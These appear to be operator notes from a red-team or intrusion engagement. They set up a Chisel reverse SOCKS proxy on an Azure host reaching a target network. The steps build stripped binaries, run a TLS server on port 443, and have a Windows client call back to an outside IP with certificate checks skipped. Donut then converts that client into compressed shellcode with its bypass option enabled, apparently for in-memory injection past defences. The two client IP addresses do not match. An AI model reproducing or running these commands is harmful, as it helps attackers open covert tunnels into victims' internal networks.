**Chisel Usage Notes**

### Overview

- **Working Socks Proxy**: Running on "Proxy-4" in Azure and connects to IN-BLUWV.
- **Purpose**: Setting up and using Chisel for creating a socks proxy in the specified environment.

### Steps to Use Chisel

1. **Get Modules:**
   ```plaintext
   go mod vendor
   ```

2. **Build for Linux:**
   ```plaintext
   go build -ldflags="-s -w" .
   ```

3. **Build for Windows:**
   ```plaintext
   GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" .
   ```

4. **Create TLS Key and Certificate:**
   ```plaintext
   openssl req -nodes -new -x509 -keyout server.key -out server.cert
   ```

5. **Start Chisel Server:**
   ```plaintext
   sudo ./chisel server -v -p 443 --tls-key ./certs/server.key --tls-cert ./certs/server.cert --reverse
   ```

6. **Start Chisel Client:**
   ```plaintext
   .\chisel_win64.exe client -v --tls-skip-verify https://68.2.9.9 R:socks
   ```

7. **Create Shellcode of the Client:**
   ```plaintext
   .\donut.exe -a 2 --input .\chisel_win64.exe -o chisel_win64_TLS.bin --args "client -v --tls-skip-verify https://68.29.7.5 R:socks" --bypass 1 --compress 4
   ```

### Notes

- **Server Configuration**: Ensure the server is correctly configured with the TLS key and certificate.
- **Client Configuration**: Verify the client is set to skip TLS verification and point to the correct server IP and port.
- **Shellcode Creation**: Use Donut to create shellcode from the Chisel client binary, with appropriate arguments for the environment.
